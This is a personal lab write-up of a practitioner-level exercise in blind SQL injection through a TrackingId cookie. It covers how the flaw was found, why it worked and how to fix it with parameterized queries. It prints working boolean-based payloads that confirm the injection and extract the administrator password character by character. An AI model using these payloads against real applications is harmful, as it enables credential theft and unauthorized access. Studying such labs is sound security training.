# Lab: Blind SQL injection with conditional responses

- **Topic:** SQL Injection
- **Difficulty:** Practitioner
- **Date:** 24-05-2026
- **Status:** ✅ Solved

---

## What was the vulnerability?
Blind SQL injection in the TrackingId cookie. The app didn't return query results but showed "Welcome back!" message when the query returned data — allowing boolean-based blind extraction.

---

## How did I find it?
Modified TrackingId cookie in Burp. Noticed "Welcome back!" appeared with true conditions and disappeared with false conditions. Used this as a yes/no oracle to extract data character by character.

---

## Payload used

```sql
-- Confirm blind SQLi
TrackingId=xyz' AND '1'='1   -- Welcome back appears
TrackingId=xyz' AND '1'='2   -- Welcome back disappears

-- Confirm admin exists
xyz' AND (SELECT 'x' FROM users WHERE username='administrator')='x

-- Find password length
xyz' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>19)='x

-- Extract each character
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

---

## Why did it work?
The TrackingId was used in a SQL query without sanitization. The "Welcome back!" message was conditionally shown based on query results. By injecting boolean conditions tied to password characters, I turned the message into a yes/no signal to extract the password one character at a time.

---

## Tools used
Wrote a custom Python script using the `requests` library to automate character extraction across all 20 positions. Completed in under 2 minutes.

---

## What would fix it?
Parameterized queries. Also avoid leaking application state through UI differences based on backend query results.

---

## Key takeaway
Even when no data is returned, differences in application behaviour can leak information. Any boolean signal — text appearing, redirects, delays — can be used to extract data bit by bit.
